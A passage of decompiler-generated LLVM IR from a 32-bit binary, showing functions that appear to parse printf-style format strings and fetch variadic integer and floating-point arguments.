  uselistorder label %dec_label_pc_804c5d7, { 1, 9, 2, 3, 4, 5, 7, 8, 6, 0 }
  uselistorder label %dec_label_pc_804c5a9, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804c59f, { 1, 0 }
  uselistorder label %dec_label_pc_804c564, { 1, 0 }
  uselistorder label %dec_label_pc_804c555, { 1, 0 }
  uselistorder label %dec_label_pc_804c4e9, { 1, 0 }
  uselistorder label %dec_label_pc_804c4bb, { 1, 0 }
  uselistorder label %dec_label_pc_804c4a0, { 1, 0 }
  uselistorder label %dec_label_pc_804c48a, { 1, 0 }
  uselistorder label %dec_label_pc_804c476, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c46a, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c403, { 1, 0 }
  uselistorder label %dec_label_pc_804c3f6, { 1, 0 }
  uselistorder label %dec_label_pc_804c381, { 1, 0 }
  uselistorder label %dec_label_pc_804c315, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ca, { 1, 0 }
  uselistorder label %dec_label_pc_804c2bb, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804c281, { 1, 0 }
  uselistorder label %dec_label_pc_804c268, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804c219, { 1, 0 }
  uselistorder label %dec_label_pc_804c200, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ec, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c1c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c155, { 1, 0 }
  uselistorder label %dec_label_pc_804c14d, { 1, 0 }
  uselistorder label %dec_label_pc_804c0f9, { 1, 0 }
  uselistorder label %dec_label_pc_804c0ee, { 1, 0 }
  uselistorder label %dec_label_pc_804c0c4.backedge, { 2, 1, 0 }
}

define i32 @function_804c5ec(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804c5ec:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c5ec = load i32, i32* @esi, align 4
  %v0_804c5ed = load i32, i32* @ebx, align 4
  store i32 %v0_804c5ed, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804c601 = bitcast i32* %arg1 to i8*
  %v4_804c601 = call i32 @function_804d178(i8* %v3_804c601, i32 0, i32 188)
  store i32 %v4_804c601, i32* %eax.global-to-local, align 4
  %v0_804c606 = load i32, i32* @ebx, align 4
  %v1_804c606 = add i32 %v0_804c606, 24
  %v2_804c606 = inttoptr i32 %v1_804c606 to i32*
  %v3_804c606 = load i32, i32* %v2_804c606, align 4
  %v4_804c606 = add i32 %v3_804c606, -1
  store i32 %v4_804c606, i32* %v2_804c606, align 4
  %v0_804c609 = load i32, i32* @esi, align 4
  %v1_804c609 = load i32, i32* @ebx, align 4
  %v2_804c609 = inttoptr i32 %v1_804c609 to i32*
  store i32 %v0_804c609, i32* %v2_804c609, align 4
  %v0_804c60b = load i32, i32* @ebx, align 4
  %v1_804c60b = add i32 %v0_804c60b, 40
  store i32 %v1_804c60b, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c616

dec_label_pc_804c616:                             ; preds = %dec_label_pc_804c616, %dec_label_pc_804c5ec
  %v0_804c616 = phi i32 [ %v1_804c61c, %dec_label_pc_804c616 ], [ %v1_804c60b, %dec_label_pc_804c5ec ]
  %v1_804c616 = inttoptr i32 %v0_804c616 to i32*
  store i32 8, i32* %v1_804c616, align 4
  %v0_804c61c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c61c = add i32 %v0_804c61c, 4
  store i32 %v1_804c61c, i32* %eax.global-to-local, align 4
  %v0_804c61f = load i32, i32* %edx.global-to-local, align 4
  %v1_804c61f = add i32 %v0_804c61f, -1
  %v8_804c61f = icmp eq i32 %v1_804c61f, 0
  store i32 %v1_804c61f, i32* %edx.global-to-local, align 4
  %v1_804c620 = icmp eq i1 %v8_804c61f, false
  br i1 %v1_804c620, label %dec_label_pc_804c616, label %dec_label_pc_804c622

dec_label_pc_804c622:                             ; preds = %dec_label_pc_804c616
  %v0_804c622 = load i32, i32* @esi, align 4
  store i32 %v0_804c622, i32* %eax.global-to-local, align 4
  %v1_804c64d20 = inttoptr i32 %v0_804c622 to i8*
  %v2_804c64d21 = load i8, i8* %v1_804c64d20, align 1
  %v3_804c64d22 = zext i8 %v2_804c64d21 to i32
  %v5_804c64d23 = and i32 %v1_804c61f, -256
  %v6_804c64d24 = or i32 %v3_804c64d22, %v5_804c64d23
  store i32 %v6_804c64d24, i32* %edx.global-to-local, align 4
  %v4_804c64f25 = icmp eq i8 %v2_804c64d21, 0
  %v1_804c65126 = icmp eq i1 %v4_804c64f25, false
  br i1 %v1_804c65126, label %dec_label_pc_804c62b, label %dec_label_pc_804c653

dec_label_pc_804c62b:                             ; preds = %dec_label_pc_804c622, %dec_label_pc_804c64d.backedge
  %v6_804c64d29 = phi i32 [ %v6_804c64d, %dec_label_pc_804c64d.backedge ], [ %v6_804c64d24, %dec_label_pc_804c622 ]
  %v2_804c64d28 = phi i8 [ %v2_804c64d, %dec_label_pc_804c64d.backedge ], [ %v2_804c64d21, %dec_label_pc_804c622 ]
  %v0_804c63027 = phi i32 [ %v0_804c630.be, %dec_label_pc_804c64d.backedge ], [ %v0_804c622, %dec_label_pc_804c622 ]
  %v10_804c62b = icmp eq i8 %v2_804c64d28, 37
  %v1_804c62e = icmp eq i1 %v10_804c62b, false
  br i1 %v1_804c62e, label %dec_label_pc_804c64c, label %dec_label_pc_804c630

dec_label_pc_804c630:                             ; preds = %dec_label_pc_804c62b
  %v1_804c630 = add i32 %v0_804c63027, 1
  store i32 %v1_804c630, i32* %eax.global-to-local, align 4
  %v1_804c631 = inttoptr i32 %v1_804c630 to i8*
  %v2_804c631 = load i8, i8* %v1_804c631, align 1
  %v11_804c631 = icmp eq i8 %v2_804c631, 37
  br i1 %v11_804c631, label %dec_label_pc_804c64c, label %dec_label_pc_804c636

dec_label_pc_804c636:                             ; preds = %dec_label_pc_804c630
  %v1_804c639 = load i32, i32* @ebx, align 4
  %v2_804c639 = inttoptr i32 %v1_804c639 to i32*
  store i32 %v1_804c630, i32* %v2_804c639, align 4
  %v0_804c63b = load i32, i32* @ebx, align 4
  %v1_804c63c = inttoptr i32 %v0_804c63b to i32*
  %v2_804c63c = call i32 @function_804c7d9(i32* %v1_804c63c)
  store i32 %v2_804c63c, i32* %eax.global-to-local, align 4
  %v2_804c644 = icmp slt i32 %v2_804c63c, 0
  br i1 %v2_804c644, label %dec_label_pc_804c657, label %dec_label_pc_804c648

dec_label_pc_804c648:                             ; preds = %dec_label_pc_804c636
  %v0_804c648 = load i32, i32* @ebx, align 4
  %v1_804c648 = inttoptr i32 %v0_804c648 to i32*
  %v2_804c648 = load i32, i32* %v1_804c648, align 4
  %v4_804c64d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c64d.backedge

dec_label_pc_804c64c:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c62b
  %v0_804c64c = phi i32 [ %v1_804c630, %dec_label_pc_804c630 ], [ %v0_804c63027, %dec_label_pc_804c62b ]
  %v1_804c64c = add i32 %v0_804c64c, 1
  br label %dec_label_pc_804c64d.backedge

dec_label_pc_804c64d.backedge:                    ; preds = %dec_label_pc_804c64c, %dec_label_pc_804c648
  %v4_804c64d.be = phi i32 [ %v4_804c64d.pre.pre, %dec_label_pc_804c648 ], [ %v6_804c64d29, %dec_label_pc_804c64c ]
  %v0_804c630.be = phi i32 [ %v2_804c648, %dec_label_pc_804c648 ], [ %v1_804c64c, %dec_label_pc_804c64c ]
  store i32 %v0_804c630.be, i32* %eax.global-to-local, align 4
  %v1_804c64d = inttoptr i32 %v0_804c630.be to i8*
  %v2_804c64d = load i8, i8* %v1_804c64d, align 1
  %v3_804c64d = zext i8 %v2_804c64d to i32
  %v5_804c64d = and i32 %v4_804c64d.be, -256
  %v6_804c64d = or i32 %v3_804c64d, %v5_804c64d
  store i32 %v6_804c64d, i32* %edx.global-to-local, align 4
  %v4_804c64f = icmp eq i8 %v2_804c64d, 0
  %v1_804c651 = icmp eq i1 %v4_804c64f, false
  br i1 %v1_804c651, label %dec_label_pc_804c62b, label %dec_label_pc_804c64d.dec_label_pc_804c653_crit_edge

dec_label_pc_804c64d.dec_label_pc_804c653_crit_edge: ; preds = %dec_label_pc_804c64d.backedge
  %v0_804c653.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c653

dec_label_pc_804c653:                             ; preds = %dec_label_pc_804c64d.dec_label_pc_804c653_crit_edge, %dec_label_pc_804c622
  %v0_804c653 = phi i32 [ %v0_804c653.pre, %dec_label_pc_804c64d.dec_label_pc_804c653_crit_edge ], [ %v0_804c622, %dec_label_pc_804c622 ]
  %v1_804c653 = load i32, i32* @ebx, align 4
  %v2_804c653 = inttoptr i32 %v1_804c653 to i32*
  store i32 %v0_804c653, i32* %v2_804c653, align 4
  br label %dec_label_pc_804c657

dec_label_pc_804c657:                             ; preds = %dec_label_pc_804c636, %dec_label_pc_804c653
  %storemerge = phi i32 [ 0, %dec_label_pc_804c653 ], [ -1, %dec_label_pc_804c636 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804c657 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c657, i32* @edx, align 4
  %v2_804c658 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c658, i32* @ebx, align 4
  store i32 %v0_804c5ec, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804c64d, { 1, 0 }
  uselistorder i8 %v2_804c64d, { 1, 2, 0 }
  uselistorder i32 %v0_804c630.be, { 2, 1, 0 }
  uselistorder i32 %v0_804c63027, { 1, 0 }
  uselistorder i32 %v0_804c622, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c61f, { 0, 2, 1 }
  uselistorder i32 %v1_804c61c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804c657, { 1, 0 }
  uselistorder label %dec_label_pc_804c62b, { 1, 0 }
}

define i32 @function_804c65c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c65c:
  %stack_var_-12 = alloca i32, align 4
  %v0_804c65c = load i32, i32* @esi, align 4
  %v0_804c65d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c669 = add i32 %arg1, 24
  %v2_804c669 = inttoptr i32 %v1_804c669 to i32*
  %v3_804c669 = load i32, i32* %v2_804c669, align 4
  %v2_804c66c = add i32 %arg1, 76
  %v3_804c66c = inttoptr i32 %v2_804c66c to i32*
  store i32 %arg2, i32* %v3_804c66c, align 4
  %tmp8 = icmp slt i32 %v3_804c669, 1
  br i1 %tmp8, label %dec_label_pc_804c69a, label %dec_label_pc_804c673

dec_label_pc_804c673:                             ; preds = %dec_label_pc_804c65c
  %v1_804c676 = load i32, i32* @ebx, align 4
  %v2_804c676 = add i32 %v1_804c676, 28
  %v3_804c676 = inttoptr i32 %v2_804c676 to i32*
  store i32 %v3_804c669, i32* %v3_804c676, align 4
  %v0_804c679 = load i32, i32* @ebx, align 4
  %v1_804c679 = add i32 %v0_804c679, 24
  %v2_804c679 = inttoptr i32 %v1_804c679 to i32*
  store i32 0, i32* %v2_804c679, align 4
  %v0_804c680 = load i32, i32* @ebx, align 4
  %v1_804c680 = add i32 %v0_804c680, 4
  %v2_804c680 = inttoptr i32 %v1_804c680 to i32*
  store i32 0, i32* %v2_804c680, align 4
  %v0_804c687 = load i32, i32* @ebx, align 4
  %v1_804c687 = add i32 %v0_804c687, 8
  %v2_804c687 = inttoptr i32 %v1_804c687 to i32*
  store i32 0, i32* %v2_804c687, align 4
  %v0_804c68e = load i32, i32* @ebx, align 4
  %v1_804c68f = call i32 @function_804c6a0(i32 %v0_804c68e)
  %v1_804c694 = load i32, i32* @ebx, align 4
  %v2_804c694 = add i32 %v1_804c694, 24
  %v3_804c694 = inttoptr i32 %v2_804c694 to i32*
  store i32 %v3_804c669, i32* %v3_804c694, align 4
  br label %dec_label_pc_804c69a

dec_label_pc_804c69a:                             ; preds = %dec_label_pc_804c65c, %dec_label_pc_804c673
  %v2_804c69a = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804c65d, i32* @ebx, align 4
  store i32 %v0_804c65c, i32* @esi, align 4
  ret i32 %v2_804c69a

; uselistorder directives
  uselistorder i32 %v3_804c669, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804c6a0, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c69a, { 1, 0 }
}

define i32 @function_804c6a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c6a0:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c6a1 = load i32, i32* @ebx, align 4
  store i32 %v0_804c6a1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804c6a6 = add i32 %arg1, 80
  store i32 %v1_804c6a6, i32* %ebx.global-to-local, align 4
  %v1_804c6a9 = add i32 %arg1, 24
  %v2_804c6a9 = inttoptr i32 %v1_804c6a9 to i32*
  %v3_804c6a9 = load i32, i32* %v2_804c6a9, align 4
  %v4_804c6a9 = icmp eq i32 %v3_804c6a9, 0
  %v1_804c6ad = icmp eq i1 %v4_804c6a9, false
  %v1_804c763 = add i32 %arg1, 8
  %v2_804c763 = inttoptr i32 %v1_804c763 to i32*
  %v3_804c763 = load i32, i32* %v2_804c763, align 4
  %v8_804c763 = icmp eq i32 %v3_804c763, -2147483648
  %v1_804c76a = icmp eq i1 %v8_804c763, false
  br i1 %v1_804c6ad, label %dec_label_pc_804c763, label %dec_label_pc_804c6b3

dec_label_pc_804c6b3:                             ; preds = %dec_label_pc_804c6a0
  br i1 %v1_804c76a, label %dec_label_pc_804c6cd, label %dec_label_pc_804c6bc

dec_label_pc_804c6bc:                             ; preds = %dec_label_pc_804c6b3
  %v1_804c6bc = add i32 %arg1, 76
  %v2_804c6bc = inttoptr i32 %v1_804c6bc to i32*
  %v3_804c6bc = load i32, i32* %v2_804c6bc, align 4
  store i32 %v3_804c6bc, i32* %eax.global-to-local, align 4
  %v1_804c6bf = add i32 %v3_804c6bc, 4
  store i32 %v1_804c6bf, i32* %edx.global-to-local, align 4
  store i32 %v1_804c6bf, i32* %v2_804c6bc, align 4
  %v0_804c6c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6c5 = inttoptr i32 %v0_804c6c5 to i32*
  %v2_804c6c5 = load i32, i32* %v1_804c6c5, align 4
  store i32 %v2_804c6c5, i32* %eax.global-to-local, align 4
  %v1_804c6c7 = load i32, i32* @ecx, align 4
  %v2_804c6c7 = add i32 %v1_804c6c7, 80
  %v3_804c6c7 = inttoptr i32 %v2_804c6c7 to i32*
  store i32 %v2_804c6c5, i32* %v3_804c6c7, align 4
  %v0_804c6ca = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6ca = load i32, i32* @ecx, align 4
  %v2_804c6ca = add i32 %v1_804c6ca, 8
  %v3_804c6ca = inttoptr i32 %v2_804c6ca to i32*
  store i32 %v0_804c6ca, i32* %v3_804c6ca, align 4
  %v0_804c6cd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c6cd

dec_label_pc_804c6cd:                             ; preds = %dec_label_pc_804c6b3, %dec_label_pc_804c6bc
  %v1_804c6dc = phi i32 [ %arg1, %dec_label_pc_804c6b3 ], [ %v0_804c6cd.pre, %dec_label_pc_804c6bc ]
  %v1_804c6cd = add i32 %v1_804c6dc, 4
  %v2_804c6cd = inttoptr i32 %v1_804c6cd to i32*
  %v3_804c6cd = load i32, i32* %v2_804c6cd, align 4
  %v8_804c6cd = icmp eq i32 %v3_804c6cd, -2147483648
  %v1_804c6d4 = icmp eq i1 %v8_804c6cd, false
  br i1 %v1_804c6d4, label %dec_label_pc_804c6e7, label %dec_label_pc_804c6d6

dec_label_pc_804c6d6:                             ; preds = %dec_label_pc_804c6cd
  %v1_804c6d6 = add i32 %v1_804c6dc, 76
  %v2_804c6d6 = inttoptr i32 %v1_804c6d6 to i32*
  %v3_804c6d6 = load i32, i32* %v2_804c6d6, align 4
  store i32 %v3_804c6d6, i32* %eax.global-to-local, align 4
  %v1_804c6d9 = add i32 %v3_804c6d6, 4
  store i32 %v1_804c6d9, i32* %edx.global-to-local, align 4
  store i32 %v1_804c6d9, i32* %v2_804c6d6, align 4
  %v0_804c6df = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6df = inttoptr i32 %v0_804c6df to i32*
  %v2_804c6df = load i32, i32* %v1_804c6df, align 4
  store i32 %v2_804c6df, i32* %eax.global-to-local, align 4
  %v1_804c6e1 = load i32, i32* @ecx, align 4
  %v2_804c6e1 = add i32 %v1_804c6e1, 80
  %v3_804c6e1 = inttoptr i32 %v2_804c6e1 to i32*
  store i32 %v2_804c6df, i32* %v3_804c6e1, align 4
  %v0_804c6e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6e4 = load i32, i32* @ecx, align 4
  %v2_804c6e4 = add i32 %v1_804c6e4, 4
  %v3_804c6e4 = inttoptr i32 %v2_804c6e4 to i32*
  store i32 %v0_804c6e4, i32* %v3_804c6e4, align 4
  %v1_804c75c17.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c6e7

dec_label_pc_804c6e7:                             ; preds = %dec_label_pc_804c6cd, %dec_label_pc_804c6d6
  %v1_804c75c17 = phi i32 [ %v1_804c6dc, %dec_label_pc_804c6cd ], [ %v1_804c75c17.pre, %dec_label_pc_804c6d6 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804c75c18 = add i32 %v1_804c75c17, 28
  %v3_804c75c19 = inttoptr i32 %v2_804c75c18 to i32*
  %v4_804c75c20 = load i32, i32* %v3_804c75c19, align 4
  %v5_804c75f21 = icmp sgt i32 %v4_804c75c20, 0
  br i1 %v5_804c75f21, label %dec_label_pc_804c6eb, label %dec_label_pc_804c791.loopexit

dec_label_pc_804c6eb:                             ; preds = %dec_label_pc_804c6e7, %dec_label_pc_804c75b
  %v1_804c75c23 = phi i32 [ %v1_804c75c, %dec_label_pc_804c75b ], [ %v1_804c75c17, %dec_label_pc_804c6e7 ]
  %v1_804c6eb22 = phi i32 [ %v1_804c75b, %dec_label_pc_804c75b ], [ 0, %dec_label_pc_804c6e7 ]
  %v2_804c6eb = mul i32 %v1_804c6eb22, 4
  %v3_804c6eb = add i32 %v2_804c6eb, 40
  %v4_804c6eb = add i32 %v3_804c6eb, %v1_804c75c23
  %v5_804c6eb = inttoptr i32 %v4_804c6eb to i32*
  %v6_804c6eb = load i32, i32* %v5_804c6eb, align 4
  store i32 %v6_804c6eb, i32* %eax.global-to-local, align 4
  %v1_804c6ef = add i32 %v6_804c6eb, -8
  %v9_804c6ef = icmp eq i32 %v1_804c6ef, 0
  br i1 %v9_804c6ef, label %dec_label_pc_804c75b, label %dec_label_pc_804c6f4

dec_label_pc_804c6f4:                             ; preds = %dec_label_pc_804c6eb
  %v10_804c6ef = icmp slt i32 %v1_804c6ef, 0
  %v6_804c6ef = sub i32 7, %v6_804c6eb
  %v7_804c6ef = and i32 %v6_804c6ef, %v6_804c6eb
  %v8_804c6ef = icmp slt i32 %v7_804c6ef, 0
  %v1_804c6f4 = add i32 %v1_804c75c23, 76
  %v2_804c6f4 = inttoptr i32 %v1_804c6f4 to i32*
  %v3_804c6f4 = load i32, i32* %v2_804c6f4, align 4
  store i32 %v3_804c6f4, i32* %edx.global-to-local, align 4
  %v3_804c6f7 = icmp eq i1 %v10_804c6ef, %v8_804c6ef
  br i1 %v3_804c6f7, label %dec_label_pc_804c707, label %dec_label_pc_804c6f9

dec_label_pc_804c6f9:                             ; preds = %dec_label_pc_804c6f4
  %tmp15 = icmp slt i32 %v6_804c6eb, 3
  %v9_804c700 = icmp eq i32 %v6_804c6eb, 7
  %v1_804c703 = icmp eq i1 %v9_804c700, false
  %or.cond = or i1 %tmp15, %v1_804c703
  br i1 %or.cond, label %dec_label_pc_804c74e, label %dec_label_pc_804c730

dec_label_pc_804c707:                             ; preds = %dec_label_pc_804c6f4
  %tmp16 = icmp sgt i32 %v6_804c6eb, 1024
  br i1 %tmp16, label %dec_label_pc_804c710, label %dec_label_pc_804c74e

dec_label_pc_804c710:                             ; preds = %dec_label_pc_804c707
  %v6_804c710 = icmp eq i32 %v6_804c6eb, 2048
  br i1 %v6_804c710, label %dec_label_pc_804c720, label %dec_label_pc_804c717

dec_label_pc_804c717:                             ; preds = %dec_label_pc_804c710
  %v9_804c717 = icmp eq i32 %v6_804c6eb, 2055
  %v1_804c71c = icmp eq i1 %v9_804c717, false
  br i1 %v1_804c71c, label %dec_label_pc_804c74e, label %dec_label_pc_804c73f

dec_label_pc_804c720:                             ; preds = %dec_label_pc_804c710
  %v1_804c720 = add i32 %v3_804c6f4, 8
  store i32 %v1_804c720, i32* %eax.global-to-local, align 4
  store i32 %v1_804c720, i32* %v2_804c6f4, align 4
  %v0_804c726 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c726 = inttoptr i32 %v0_804c726 to i32*
  %v2_804c726 = load i32, i32* %v1_804c726, align 4
  store i32 %v2_804c726, i32* %eax.global-to-local, align 4
  %v1_804c728 = add i32 %v0_804c726, 4
  %v2_804c728 = inttoptr i32 %v1_804c728 to i32*
  %v3_804c728 = load i32, i32* %v2_804c728, align 4
  store i32 %v3_804c728, i32* %edx.global-to-local, align 4
  %v1_804c72b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c72b = add i32 %v1_804c72b, 4
  %v3_804c72b = inttoptr i32 %v2_804c72b to i32*
  store i32 %v3_804c728, i32* %v3_804c72b, align 4
  %v0_804c756.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c756

dec_label_pc_804c730:                             ; preds = %dec_label_pc_804c6f9
  %v3_804c730 = load i32, i32* %v2_804c6f4, align 4
  store i32 %v3_804c730, i32* %edx.global-to-local, align 4
  %v1_804c733 = add i32 %v3_804c730, 8
  store i32 %v1_804c733, i32* %eax.global-to-local, align 4
  store i32 %v1_804c733, i32* %v2_804c6f4, align 4
  %v0_804c739 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c739 = inttoptr i32 %v0_804c739 to double*
  %v2_804c739 = load double, double* %v1_804c739, align 4
  %v2_804c73b = load i32, i32* %ebx.global-to-local, align 4
  %v4_804c73b = inttoptr i32 %v2_804c73b to double*
  store double %v2_804c739, double* %v4_804c73b, align 4
  br label %dec_label_pc_804c758

dec_label_pc_804c73f:                             ; preds = %dec_label_pc_804c717
  %v3_804c73f = load i32, i32* %v2_804c6f4, align 4
  store i32 %v3_804c73f, i32* %edx.global-to-local, align 4
  %v1_804c742 = add i32 %v3_804c73f, 12
  store i32 %v1_804c742, i32* %eax.global-to-local, align 4
  store i32 %v1_804c742, i32* %v2_804c6f4, align 4
  %v0_804c748 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c748 = inttoptr i32 %v0_804c748 to x86_fp80*
  %v2_804c748 = load x86_fp80, x86_fp80* %v1_804c748, align 4
  %v2_804c74a = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c74a = inttoptr i32 %v2_804c74a to x86_fp80*
  store x86_fp80 %v2_804c748, x86_fp80* %v3_804c74a, align 4
  br label %dec_label_pc_804c758

dec_label_pc_804c74e:                             ; preds = %dec_label_pc_804c6f9, %dec_label_pc_804c707, %dec_label_pc_804c717
  %v1_804c74e = add i32 %v3_804c6f4, 4
  store i32 %v1_804c74e, i32* %eax.global-to-local, align 4
  store i32 %v1_804c74e, i32* %v2_804c6f4, align 4
  %v0_804c754 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c754 = inttoptr i32 %v0_804c754 to i32*
  %v2_804c754 = load i32, i32* %v1_804c754, align 4
  store i32 %v2_804c754, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c756

dec_label_pc_804c756:                             ; preds = %dec_label_pc_804c720, %dec_label_pc_804c74e
  %v0_804c756 = phi i32 [ %v0_804c756.pre, %dec_label_pc_804c720 ], [ %v2_804c754, %dec_label_pc_804c74e ]
  %v1_804c756 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c756 = inttoptr i32 %v1_804c756 to i32*
  store i32 %v0_804c756, i32* %v2_804c756, align 4
  %v0_804c758.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c758

dec_label_pc_804c758:                             ; preds = %dec_label_pc_804c73f, %dec_label_pc_804c730, %dec_label_pc_804c756
  %v0_804c758 = phi i32 [ %v2_804c74a, %dec_label_pc_804c73f ], [ %v2_804c73b, %dec_label_pc_804c730 ], [ %v0_804c758.pre, %dec_label_pc_804c756 ]
  %v1_804c758 = add i32 %v0_804c758, 12
  store i32 %v1_804c758, i32* %ebx.global-to-local, align 4
  %v0_804c75b.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804c75c.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c75b

dec_label_pc_804c75b:                             ; preds = %dec_label_pc_804c6eb, %dec_label_pc_804c758
  %v1_804c75c = phi i32 [ %v1_804c75c23, %dec_label_pc_804c6eb ], [ %v1_804c75c.pre, %dec_label_pc_804c758 ]
  %v0_804c75b = phi i32 [ %v1_804c6eb22, %dec_label_pc_804c6eb ], [ %v0_804c75b.pre, %dec_label_pc_804c758 ]
  %v1_804c75b = add i32 %v0_804c75b, 1
  store i32 %v1_804c75b, i32* %esi.global-to-local, align 4
  %v2_804c75c = add i32 %v1_804c75c, 28
  %v3_804c75c = inttoptr i32 %v2_804c75c to i32*
  %v4_804c75c = load i32, i32* %v3_804c75c, align 4
  %v5_804c75f = icmp slt i32 %v1_804c75b, %v4_804c75c
  br i1 %v5_804c75f, label %dec_label_pc_804c6eb, label %dec_label_pc_804c791.loopexit

dec_label_pc_804c763:                             ; preds = %dec_label_pc_804c6a0
  br i1 %v1_804c76a, label %dec_label_pc_804c77a, label %dec_label_pc_804c76c

dec_label_pc_804c76c:                             ; preds = %dec_label_pc_804c763
  %v1_804c76c = add i32 %arg1, 36
  %v2_804c76c = inttoptr i32 %v1_804c76c to i8*
  %v3_804c76c = load i8, i8* %v2_804c76c, align 1
  %v2_804c770 = zext i8 %v3_804c76c to i32
  %v3_804c770 = mul nuw nsw i32 %v2_804c770, 12
  store i32 %v3_804c770, i32* %eax.global-to-local, align 4
  %v2_804c773 = add i32 %arg1, 68
  %v3_804c773 = add i32 %v2_804c773, %v3_804c770
  %v4_804c773 = inttoptr i32 %v3_804c773 to i32*
  %v5_804c773 = load i32, i32* %v4_804c773, align 4
  store i32 %v5_804c773, i32* %eax.global-to-local, align 4
  store i32 %v5_804c773, i32* %v2_804c763, align 4
  %v0_804c77a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c77a

dec_label_pc_804c77a:                             ; preds = %dec_label_pc_804c763, %dec_label_pc_804c76c
  %v1_804c78e = phi i32 [ %arg1, %dec_label_pc_804c763 ], [ %v0_804c77a.pre, %dec_label_pc_804c76c ]
  %v1_804c77a = add i32 %v1_804c78e, 4
  %v2_804c77a = inttoptr i32 %v1_804c77a to i32*
  %v3_804c77a = load i32, i32* %v2_804c77a, align 4
  %v8_804c77a = icmp eq i32 %v3_804c77a, -2147483648
  %v1_804c781 = icmp eq i1 %v8_804c77a, false
  br i1 %v1_804c781, label %dec_label_pc_804c791, label %dec_label_pc_804c783

dec_label_pc_804c783:                             ; preds = %dec_label_pc_804c77a
  %v1_804c783 = add i32 %v1_804c78e, 37
  %v2_804c783 = inttoptr i32 %v1_804c783 to i8*
  %v3_804c783 = load i8, i8* %v2_804c783, align 1
  %v2_804c787 = zext i8 %v3_804c783 to i32
  %v3_804c787 = mul nuw nsw i32 %v2_804c787, 12
  store i32 %v3_804c787, i32* %eax.global-to-local, align 4
  %v1_804c78a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c78a = add nsw i32 %v3_804c787, -12
  %v3_804c78a = add i32 %v2_804c78a, %v1_804c78a
  %v4_804c78a = inttoptr i32 %v3_804c78a to i32*
  %v5_804c78a = load i32, i32* %v4_804c78a, align 4
  store i32 %v5_804c78a, i32* %eax.global-to-local, align 4
  store i32 %v5_804c78a, i32* %v2_804c77a, align 4
  %v0_804c791.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c791

dec_label_pc_804c791.loopexit:                    ; preds = %dec_label_pc_804c75b, %dec_label_pc_804c6e7
  %v1_804c75c.lcssa = phi i32 [ %v1_804c75c17, %dec_label_pc_804c6e7 ], [ %v1_804c75c, %dec_label_pc_804c75b ]
  br label %dec_label_pc_804c791

dec_label_pc_804c791:                             ; preds = %dec_label_pc_804c791.loopexit, %dec_label_pc_804c77a, %dec_label_pc_804c783
  %v10_804c798 = phi i32 [ %v1_804c75c.lcssa, %dec_label_pc_804c791.loopexit ], [ %v1_804c78e, %dec_label_pc_804c77a ], [ %v0_804c791.pre, %dec_label_pc_804c783 ]
  %v1_804c791 = add i32 %v10_804c798, 8
